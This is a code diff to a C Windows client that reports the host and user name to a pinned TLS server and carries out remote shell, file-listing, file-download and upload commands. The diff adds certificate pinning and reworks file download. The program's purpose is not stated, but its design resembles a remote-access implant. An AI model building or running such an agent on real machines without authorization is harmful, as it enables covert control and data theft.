@@ -9,6 +9,7 @@
 #include <stdarg.h>
 #include <stdio.h>
 static const char kServer[] = "127.0.0.1:8443";
+static const unsigned char kPin[32] = { 0x08,0x22,0x8D,0xA7,0x86,0x98,0x4D,0x60,0x9B,0x76,0xEA,0xF9,0xF8,0x5B,0xD7,0x97,0x0F,0xC3,0x8A,0x4F,0xB5,0x2C,0x7A,0x4B,0xB1,0xF4,0x69,0x1B,0x65,0xB3,0x1F,0x04 };
 static TlsCtx* g_tls = NULL;
 static volatile LONG g_run = 1;
 static volatile LONG g_bye = 0;
@@ -271,7 +272,7 @@ static DWORD WINAPI Worker(const char* addr) {
   freeaddrinfo(ai); if (s == INVALID_SOCKET) return 0;
   TlsCtx* t = (TlsCtx*)malloc(sizeof(TlsCtx)); if (!t) return 0;
   InitTlsCtx(t, s);
-  if (!TlsAcquire(t, NULL) || !TlsHandshake(t)) { free(t); closesocket(s); return 0; }
+  if (!TlsAcquire(t, NULL) || !TlsHandshake(t, kPin)) { free(t); closesocket(s); return 0; }
   EnterCriticalSection(&g_cs); g_tls = t; LeaveCriticalSection(&g_cs);
   char hbuf[256] = {0}, ubuf[256] = {0}; DWORD n = sizeof(hbuf);
   GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
@@ -285,7 +286,16 @@ static DWORD WINAPI Worker(const char* addr) {
       case C_SHELL_CLOSE: ShellStop(); break;
       case C_SHELL_DATA: if (g_hShellInW && pl) { DWORD w; WriteFile(g_hShellInW, pl, plLen, &w, NULL); } break;
       case C_FS_LIST: { uint32_t n; char* r = FsList(pl, &n); if (r) { TlsSendMsg(t, C_FS_LIST_RESP, r, n); free(r); } break; }
-      case C_FS_GET: { uint32_t n; char* d = ReadFileAll(pl, &n); if (d) { TlsSendMsg(t, C_FS_FILE, d, n); free(d); } else TlsSendMsg(t, C_FS_FILE, NULL, 0); break; }
+      case C_FS_GET: {
+        uint32_t n = 0; char* d = pl ? ReadFileAll(pl, &n) : NULL; size_t pn = pl ? strlen(pl) : 0;
+        if (!d || pn + 2 + (size_t)n > MAX_MSG) {
+          char e[64]; int el = snprintf(e, sizeof(e), "E%s\n", d ? "file too large (64 MB limit)" : "cannot read file");
+          TlsSendMsg(t, C_FS_FILE, e, el); free(d); break;
+        }
+        char* out = (char*)malloc(pn + 2 + n);
+        if (out) { out[0] = 'D'; memcpy(out + 1, pl, pn); out[pn + 1] = '\n'; memcpy(out + pn + 2, d, n); TlsSendMsg(t, C_FS_FILE, out, (uint32_t)(pn + 2 + n)); free(out); }
+        free(d); break;
+      }
       case C_FS_PUT: {
         if (!pl) break;
         char* nl = strchr(pl, '\n');
